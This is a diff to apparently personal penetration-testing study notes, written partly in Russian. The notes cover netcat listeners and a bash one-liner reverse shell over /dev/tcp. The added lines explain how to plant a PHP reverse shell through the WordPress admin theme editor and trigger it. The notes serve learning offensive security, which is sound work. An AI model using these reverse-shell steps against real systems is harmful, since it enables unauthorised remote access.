@@ -1,5 +1,5 @@
 ```shell
-nc {flags} {port}
+nc {flags} {port}(53 is better)
 ```
 
 `nc` - netcat, it gives to target connect back to you 
@@ -27,6 +27,18 @@ One-line reverse shell:
 ```bash
 bash -i >& /dev/tcp/target_ip/yourlistening port 0>&1
 ```
+
+---
+#### Reverse shell using Editing tab in WordPress admin panel
+
+1. In Tab `Appearance` -> `Editor`
+
+2. In this tab choosing the most unusable file and paste into it php-revers-shell [revShell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), or just in internet
+
+3. Pasting this php text instead of text in this page and changing `ip` to `tun0` ip that we can find using `id addr` in console and  `port` to the one we listen to in [[remote-notes/Programming/Пентест/OffSec PEN/Tools/NetCat(nc) & Reverse Shell|NetCat]]
+
+4. Opening this page code we changed
+
 
 [^1]: Входящий
 
